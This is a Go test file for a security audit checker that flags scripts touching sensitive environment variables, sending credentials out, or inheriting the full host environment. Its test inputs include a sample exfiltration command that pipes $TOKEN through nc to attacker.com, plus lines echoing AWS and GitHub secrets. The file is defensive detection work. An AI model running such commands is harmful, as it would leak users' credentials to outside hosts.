// SPDX-License-Identifier: MPL-2.0

package audit

import (
	"testing"

	"github.com/invowk/invowk/pkg/invowkfile"
)

func TestEnvChecker_SensitiveVars(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		script  string
		wantHit bool
	}{
		{"aws_token", "echo $AWS_SECRET_ACCESS_KEY", true},
		{"github_token", "echo $GITHUB_TOKEN", true},
		{"ssh_sock", "ssh-add $SSH_AUTH_SOCK", true},
		{"generic_api_key", "echo ${API_KEY}", true},
		{"clean", "echo $HOME", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			sc := newSingleScriptContext(tt.script)
			checker := NewEnvChecker()
			findings, err := checker.Check(t.Context(), sc)
			if err != nil {
				t.Fatal(err)
			}

			hasSensitive := false
			for _, f := range findings {
				if f.Category == CategoryExfiltration &&
					(f.Title == "Script accesses sensitive environment variable" ||
						f.Title == "Script accesses generic secret variable") {
					hasSensitive = true
				}
			}
			if hasSensitive != tt.wantHit {
				t.Errorf("sensitive var detected = %v, want %v", hasSensitive, tt.wantHit)
			}
		})
	}
}

func TestEnvChecker_TokenExtraction(t *testing.T) {
	t.Parallel()

	sc := newSingleScriptContext("echo $TOKEN | nc attacker.com 4444")
	checker := NewEnvChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasExtraction := false
	for _, f := range findings {
		if f.Title == "Script may extract credential to external sink" {
			hasExtraction = true
		}
	}
	if !hasExtraction {
		t.Error("expected token extraction finding")
	}
}

func TestEnvChecker_InheritAll(t *testing.T) {
	t.Parallel()

	inv := &invowkfile.Invowkfile{
		Commands: []invowkfile.Command{{
			Name: "cmd",
			Implementations: []invowkfile.Implementation{{
				Script: "echo hello",
				Runtimes: []invowkfile.RuntimeConfig{{
					Name:           invowkfile.RuntimeVirtual,
					EnvInheritMode: invowkfile.EnvInheritAll,
				}},
			}},
		}},
	}
	files := []*ScannedInvowkfile{{
		Path:       "test.cue",
		SurfaceID:  "test",
		Invowkfile: inv,
	}}
	sc := newTestScanContext(files, nil)

	checker := NewEnvChecker()
	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatal(err)
	}

	hasInheritAll := false
	for _, f := range findings {
		if f.Title == "Command inherits all host environment variables" {
			hasInheritAll = true
		}
	}
	if !hasInheritAll {
		t.Error("expected env_inherit_mode:all finding")
	}
}
